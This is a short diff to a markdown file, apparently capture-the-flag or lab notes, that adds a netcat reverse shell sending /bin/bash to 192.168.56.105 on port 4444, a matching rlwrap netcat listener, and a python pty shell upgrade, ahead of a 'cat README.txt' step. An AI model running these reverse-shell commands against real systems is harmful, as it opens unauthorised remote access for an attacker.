@@ -5,6 +5,14 @@
 
 ```bash
 
+busybox nc 192.168.56.105 4444 -e /bin/bash
+
+rlwrap nc -lvnp 4444
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+
 cat README.txt
 ```
 
